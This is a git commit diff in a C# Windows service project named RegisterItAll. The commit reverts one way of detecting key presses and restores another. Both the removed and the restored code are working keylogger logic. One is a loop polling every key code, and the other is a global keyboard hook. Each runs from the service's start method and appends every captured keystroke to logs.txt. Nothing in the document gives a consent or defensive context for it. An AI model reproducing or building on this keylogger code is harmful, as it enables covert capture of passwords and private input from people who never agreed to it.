1085f4beb60392be90f945c28876ecb56a2b205d
Alejandro <alejandrocarrion1999@gmail.com>
2021-08-21 14:02:04 +0200

    Revert "Cambiar forma de detectar teclas pulsadas."
    This reverts commit cc4c870ee7f5e8767b70fc8ca4d2d7effe496e84.

--- RegisterItAll/RegisterItAllService.cs
+++ RegisterItAll/RegisterItAllService.cs
@@ -1,8 +1,7 @@
-﻿using RegisterItAll.Managers;
+﻿using Gma.System.MouseKeyHook;
 using System;
 using System.IO;
 using System.ServiceProcess;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace RegisterItAll
@@ -20,62 +19,18 @@ namespace RegisterItAll
 
         protected override void OnStart(string[] args)
         {
-            while (true)
-            {
-                try
-                {
-                    for (int key = 0; key < 255; key++)
-                    {
-                        if (!KeystrokesCapturer.IsPressed(key))
-                        {
-                            continue;
-                        }
+            IKeyboardMouseEvents hook = Hook.GlobalEvents();
 
-                        char? pressedKey = GetPressedKey(key);
+            hook.KeyPress += OnKeyPressed;
 
-                        if (pressedKey == null)
-                        {
-                            continue;
-                        }
-
-                        Console.WriteLine(pressedKey);
-                        File.AppendAllText("logs.txt", pressedKey.ToString());
-                    }
-                }
-                catch { }
-
-                Task.Delay(50);
-            }
+            Application.Run();
         }
 
-        private static char? GetPressedKey(int key)
+        private static void OnKeyPressed(object sender, KeyPressEventArgs args)
         {
-            if (Keys.OemPeriod.Equals((Keys)key)) return '.';
-            else if (Keys.Space.Equals((Keys)key)) return ' ';
-            else if (Keys.D0.Equals((Keys)key) || Keys.NumPad0.Equals((Keys)key)) return '0';
-            else if (Keys.D1.Equals((Keys)key) || Keys.NumPad1.Equals((Keys)key)) return '1';
-            else if (Keys.D2.Equals((Keys)key) || Keys.NumPad2.Equals((Keys)key)) return '2';
-            else if (Keys.D3.Equals((Keys)key) || Keys.NumPad3.Equals((Keys)key)) return '3';
-            else if (Keys.D4.Equals((Keys)key) || Keys.NumPad4.Equals((Keys)key)) return '4';
-            else if (Keys.D5.Equals((Keys)key) || Keys.NumPad5.Equals((Keys)key)) return '5';
-            else if (Keys.D6.Equals((Keys)key) || Keys.NumPad6.Equals((Keys)key)) return '6';
-            else if (Keys.D7.Equals((Keys)key) || Keys.NumPad7.Equals((Keys)key)) return '7';
-            else if (Keys.D8.Equals((Keys)key) || Keys.NumPad8.Equals((Keys)key)) return '8';
-            else if (Keys.D9.Equals((Keys)key) || Keys.NumPad9.Equals((Keys)key)) return '9';
-            else if (Keys.LButton.Equals((Keys)key) || Keys.MButton.Equals((Keys)key)) return null;
+            Console.WriteLine(args.KeyChar.ToString());
 
-            if (key < 65 || key > 122)
-            {
-                return null;
-            }
-
-            if (KeystrokesCapturer.IsAsyncPressed(Keys.ShiftKey) && KeystrokesCapturer.IsPressed(Keys.CapsLock))
-                return Convert.ToChar(key + 32);
-            else if (KeystrokesCapturer.IsAsyncPressed(Keys.ShiftKey))
-                return Convert.ToChar(key);
-            else if (KeystrokesCapturer.IsPressed(Keys.CapsLock))
-                return Convert.ToChar(key);
-            else return Convert.ToChar(key + 32);
+            File.AppendAllText("logs.txt", args.KeyChar.ToString());
         }
     }
 }
